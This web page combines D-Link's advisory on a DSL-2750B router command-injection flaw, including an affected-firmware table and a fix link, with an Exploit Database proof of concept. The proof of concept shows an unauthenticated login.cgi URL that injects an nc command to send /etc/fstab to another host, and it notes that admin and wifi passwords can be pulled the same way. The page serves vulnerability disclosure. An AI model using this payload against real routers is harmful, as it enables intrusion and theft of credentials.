DSL-2750B - OS Command Injection Vulnerability Report - Exploit Database

**Summary**

D-Link is aware and has been investigating of the disclosure posted at [Exploit Database](https://www.exploit-db.com/exploits/44760/) . As we have proceded though our investigation, we have discovered a number of inaccuracies regarding the affected versions of DSL-2750B.  D-Link continues to keep open communication with the security research community and we are available globally for security incident reports at security @ dlink.com.

**References**

Netlab 360 - [Link](https://blog.netlab.360.com/botnets-never-die-satori-refuses-to-fade-away-en/)

Ars Technica - [Link](https://arstechnica.com/information-technology/2018/06/widely-used-d-link-modemrouter-under-mass-attack-by-potent-iot-botnet/?comments=1)

**Details**

The D-Link DSL-2750B is only availble in the US as a project SKU for services providers.  Each US deployment requires specific firmware to meet the service providers requirements. Outside the US, the product is prepared for the consumer retail sales channel, which does carry a D-Link Brand firmware associated with this vulnerability exploit. All the devices will identify as D-Link DSL-2750B, however due to their unique firmware traits many are not affected by this vulnerability report.

Due to the different deployment channels between US and Global, the DSL-2750B is not index on [http://suppport.dlink.com](http://support.dlink.com) which represents the US product offer. In the US, customer care for the DSL-2750B is coordinated through the service provider that provides it to their customers.  Outside the US, support can be found at your [regional D-Link office](https://eu.dlink.com/uk/en) or at <https://tsd.dlink.com.tw/>.

Please reference the table below for the latest information on affected devices.

**Affected Products**

| **Model** | **Hardware Rev.** | **Branded** | **Affected Firmware** | **Fixed Firmware** | **Last Updated** |
| --- | --- | --- | --- | --- | --- |
| DSL-2750B | T1/T2 | Verizon & D-Link | None | Fix Not Required | 07/11/18 |
| DSL-2750B-SG | T1 | D-Link Only | None | Fix Not Required | 07/11/18 |
| DSL-2750B-US | T1 | D-Link Only | None | Fix Not Required | 07/11/18 |
| DSL-2750B | Ax/Bx/Cx/Ex/Fx/Tx | D-Link Only (non-US) | None | Fix Not Required | 07/11/18 |
| DSL-2750B | Dx | D-Link Only (non-US) | v1.04.xx and older | [EU v1.05](https://support.dlink.com/resource/SECURITY_ADVISEMENTS/DSL-2750B/REVD/DSL-2750B_D1_EU_1.05_07302018_1521.zip) | 07/11/18 |

**Security patch for your D-Link Devices**

D-Link will update this annoucement continually.

As there are different hardware revisions on our products, please check this on your device before downloading the correct corresponding firmware update. The hardware revision information can usually be found on the product label on the underside of the product next to the serial number. Alternatively, they can also be found on the device web configuration.

# D-Link router DSL-2750B firmware 1.01 to 1.03 - remote command execution no auth required

```
After some playing around I've noticed something interesting during
login phase: by sending wrong credentials, user is redirected on an
error page with url

<http://192.168.1.1:666/login.cgi?cli=access%20login%20encrypted%2041544A25DC00170BA90659AD4CBDD9D9$>

<http://imgur.com/ZG1vU2t>

In order to see what's happening we must start the web server with the
debug output enabled:

httpd -o -p 666 -m -1 -v 5

and try again to login with wrong credentials.

<http://imgur.com/tepy3XD>

Arguments of "cli" parameter are passed directly to a binary that will
execute that particular given command; the complete list of commands
available are inside "/etc/ayecli/ayecli.cli" file. (among them there's
a creepy "system halt" that will shutdown the router no matter what).

Arguments are passed in a way that

 ayecli -c 'command-here' so

the way to escape is to close, add a command and close again to
neutralize "$" substitution with ' :

ayecli -c 'command';injection''
that is:

<http://192.168.1.1/login.cgi?cli=multilingual%20show%27;nc%20192.168.1.8%20666%20%3C%2fetc%2ffstab%27$>

<http://imgur.com/nLFnWeo>

it's also possible to retrieve admin password, wifi passphrase etc

cheers,
p@ql

thanks to ps and fp

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
